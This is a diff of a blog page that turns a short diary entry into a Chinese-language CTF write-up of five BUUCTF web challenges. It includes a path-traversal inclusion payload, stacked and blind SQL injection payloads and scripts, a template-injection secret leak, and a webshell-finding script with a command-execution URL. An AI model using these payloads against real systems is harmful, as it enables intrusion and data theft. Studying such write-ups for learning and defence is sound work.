@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="ctf,">
 
 
 
@@ -81,17 +81,18 @@
 
 
 
-<meta name="description" content="这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！">
+<meta name="description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="11.15">
-<meta property="og:url" content="http://chenxiyuan.vip/2018/11/15/11-15/index.html">
+<meta property="og:title" content="BUUCTF web writeup">
+<meta property="og:url" content="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/index.html">
 <meta property="og:site_name" content="晨曦远的博客">
-<meta property="og:description" content="这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！">
+<meta property="og:description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-07T12:47:52.151Z">
+<meta property="og:updated_time" content="2019-07-22T14:12:33.330Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="11.15">
-<meta name="twitter:description" content="这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！">
+<meta name="twitter:title" content="BUUCTF web writeup">
+<meta name="twitter:description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
 
 
 
@@ -121,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://chenxiyuan.vip/2018/11/15/11-15/">
+  <link rel="canonical" href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/">
 
 
 
 
 
-  <title>11.15 | 晨曦远的博客</title>
+  <title>BUUCTF web writeup | 晨曦远的博客</title>
   
 
 
@@ -296,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://chenxiyuan.vip/2018/11/15/11-15/">
+    <link itemprop="mainEntityOfPage" href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="晨曦远">
@@ -313,7 +314,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">11.15</h2>
+          <h2 class="post-title" itemprop="name headline">BUUCTF web writeup</h2>
         
 
         <div class="post-meta">
@@ -325,8 +326,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-15T17:33:15+08:00">
-                2018-11-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-21T23:07:20+08:00">
+                2019-07-21
               </time>
             
 
@@ -341,8 +342,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-05-07T20:47:52+08:00">
-                2019-05-07
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-22T22:12:33+08:00">
+                2019-07-22
               </time>
             
           </span>
@@ -360,8 +361,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/随笔/" itemprop="url" rel="index">
-                    <span itemprop="name">随笔</span>
+                  <a href="/categories/web安全学习笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全学习笔记</span>
                   </a>
                 </span>
 
@@ -377,7 +378,7 @@
 
           
           
-             <span id="/2018/11/15/11-15/" class="leancloud_visitors" data-flag-title="11.15">
+             <span id="/2019/07/21/BUUCTF-web-writeup/" class="leancloud_visitors" data-flag-title="BUUCTF web writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -403,7 +404,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  82 字
+                  1.5k 字
                 </span>
               
 
@@ -419,7 +420,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  7 分钟
                 </span>
               
             </div>
@@ -440,7 +441,30 @@
       
 
       
-        <p>这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！<br>然后昨天郁师傅推荐了一个上传漏洞的靶场<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a>，于是我又要学php了，得学会php的代码审计吧！！！</p>
+        <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><a href="!http://web5.buuoj.cn">靶机</a><br>F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到<code>flag in ffffllllaaaagggg</code>,继续阅读源码。<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>mb_substr() 函数返回字符串的一部分， substr()函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr().</li>
+<li>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）.<br>看到include $_REQUEST[‘file’]那就应该是文件包含读取<code>ffffllllaaaagggg</code>了,前两个条件file不为空且为字符串简单,主要是第三个条件,要通过chekFile函数返回True.<br>分析checkFile函数,有三次检测file是否是白名单中的内容,如果是则返回true.还有对$page进行的操作,如果有?则截取?之前的字符返回,如果没有则返回本身.<br>构造payload:<code>file=hint.php%3F/../../../../ffffllllaaaagggg</code>,首先第一次判断不通过，然后$page又返回自身,第二次判断不通过,进行url解码,<code>hint.php?/../../../../ffffllllaaaagggg</code>,然后$page返回?之前即<code>hint.php</code>通过第三次判断,返回true满足第三个条件.成功执行文件包含并目录穿越,读取到flag.<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><a href="http://web16.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>这道题是2019强网杯的题,我有写过wp复现,<a href="http://chenxiyuan.vip/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFwebwp">传送门</a>.<br>大致再记录一下吧.waf:<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>过滤的其实不多,并且可以用堆叠注入查表和字段，多查询几次,整个数据库结构就清晰了。</li>
+<li><code>&#39;;show tables;</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>&#39;;show columns from words;</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>&#39;;show columns from</code>1919810931114514<code>;</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以构造出原本的sql语句:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="string">`data`</span> <span class="keyword">FROM</span> words <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> ;</span><br></pre></td></tr></table></figure></p>
+<p>而select被过滤了,但查询语句查的是words表,而flag在另一个表中,如何查询呢?注意到waf黑名单其实过滤的很少的,比如alter和rename没被过滤就可以加以利用.我们可以把words表名改掉,再把flag所在表名改成words,再利用alter添加id字段,即可成功查询.payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;rename table words to wordss;rename table `1919810931114514` to `words`;alter table words add id int default 1#</span><br></pre></td></tr></table></figure></p>
+<p>另一种方法是利用自定义变量绕过.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;;use supersqli;set @sqli=concat(&apos;se&apos;,&apos;lect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sqli;EXECUTE stmt1;</span><br></pre></td></tr></table></figure></p>
+<h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p><a href="http://web15.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>也是强网杯2019的题目,下载到源码,是3000个混淆的文件,要我们从里面找到后门,那就本地搭建个环境,写个脚本自动跑好了.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">dirs = os.listdir(<span class="string">r'D:\phpStudy\WWW\test\src'</span>)</span><br><span class="line">url=<span class="string">'http://www.test.com/src/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findit</span><span class="params">(f)</span>:</span></span><br><span class="line">    path=<span class="string">'D:\\phpStudy\\WWW\\test\\src\\'</span>+f</span><br><span class="line">    r = open(path, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>).read()</span><br><span class="line">    print(<span class="string">'正在检测'</span> + f)</span><br><span class="line">    t = re.findall(<span class="string">"\$_POST\['(.*?)'\]"</span>,r,re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        data=&#123;i:<span class="string">'echo "find it";'</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.post(url+f,data=data).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'post:'</span>+i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    t = re.findall(<span class="string">"\$_GET\['(.*?)'\]"</span>, r, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'find it'</span> <span class="keyword">in</span> requests.get(url+f+<span class="string">'?'</span>+i+<span class="string">'='</span>+<span class="string">'echo "find it";'</span>).text:</span><br><span class="line">            print(<span class="string">'get shell:'</span>+f+<span class="string">'get:'</span>+i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">149</span>):</span><br><span class="line">            onelist=dirs[i*<span class="number">20</span>:(i+<span class="number">1</span>)*<span class="number">20</span><span class="number">-1</span>]</span><br><span class="line">            threads=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> onelist:</span><br><span class="line">                t = threading.Thread(target=findit,args=(j,))</span><br><span class="line">                threads.append(t)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">                threads[j].start()</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">                threads[j].join()</span><br></pre></td></tr></table></figure></p>
+<p>终于跑出来了，连上后门直接读<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web15.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure></p>
+<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p><a href="http://web9.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>得到提示<code>filehash:md5(cookie_secret + md5(filename))</code>并且flag在<code>/fllllllllllllag</code>,现在就是要得到cookie_secret.<br>访问错误的时候得到<code>http://web9.buuoj.cn/error?msg=Error</code>,这里运用了模板渲染<code>http://web9.buuoj.cn/error?msg=1</code>,测试一下果然.所以应该是服务端模板注入(ssti),一顿fuzz,还过滤了好多字符.看看<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">黑翼天使23</a>,得到思路.<br>访问<code>http://web9.buuoj.cn/error?msg=</code>,返回:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;autoreload&apos;: True, &apos;compiled_template_cache&apos;: False, &apos;cookie_secret&apos;: &apos;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&apos;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据hintMD5加密一下即可构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web9.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=70aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure></p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p><a href="http://web43.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>fuzz一下,过滤了挺多字符,空格就被过滤了,可以用括号绕过、换行绕过、或者制表符绕过.然后利用布尔盲注,可以利用返回1的时候输出<code>Hello, glzjin wants a girlfriend.</code>,当然也可以利用时间盲注不过会慢一点.写个脚本跑.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://web43.buuoj.cn/index.php"</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;'</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span> :<span class="string">"if(substr((select(flag)from(flag)),1,&#123;&#125;)='&#123;&#125;&#123;&#125;',1,2)"</span>.format(len(flag) + <span class="number">1</span>,flag,i)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            'id': "ELT(left((select(flag)from(flag)),&#123;&#125;)='&#123;&#125;&#123;&#125;',1)".format(len(flag) + 1, flag, i)</span></span><br><span class="line"><span class="string">        &#125;"""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"glzjin"</span> <span class="keyword">in</span> requests.post(url,data=data,headers=headers).text:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>学到了一个elt函数:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select elt(0,'a','b');</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(0,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| NULL           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">elt</span>(<span class="number">3</span>,<span class="string">'a'</span>,<span class="string">'b'</span>);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(3,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| NULL           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">elt</span>(<span class="number">1</span>,<span class="string">'a'</span>,<span class="string">'b'</span>);</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| elt(1,'a','b') |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| a              |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -485,7 +509,7 @@
 
     
       <div>
-        
+         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/07/21/BUUCTF-web-writeup/">BUUCTF web writeup</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年07月21日 - 23:07 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年07月22日 - 22:07 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/" title="BUUCTF web writeup">http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
 
 
 
@@ -493,6 +517,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
       
 
       
@@ -503,8 +533,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/04/铺地毯问题/" rel="next" title="铺地毯问题">
-                <i class="fa fa-chevron-left"></i> 铺地毯问题
+              <a href="/2019/07/20/php简单的登陆注册功能/" rel="next" title="php简单的登陆注册功能">
+                <i class="fa fa-chevron-left"></i> php简单的登陆注册功能
               </a>
             
           </div>
@@ -512,10 +542,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/27/nctf打卡题/" rel="prev" title="nctf打卡题">
-                nctf打卡题 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -572,8 +598,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -699,6 +734,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup"><span class="nav-number">1.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#随便注"><span class="nav-number">2.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高明的黑客"><span class="nav-number">3.</span> <span class="nav-text">高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">5.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li></ol></div>
+            
+
+          </div>
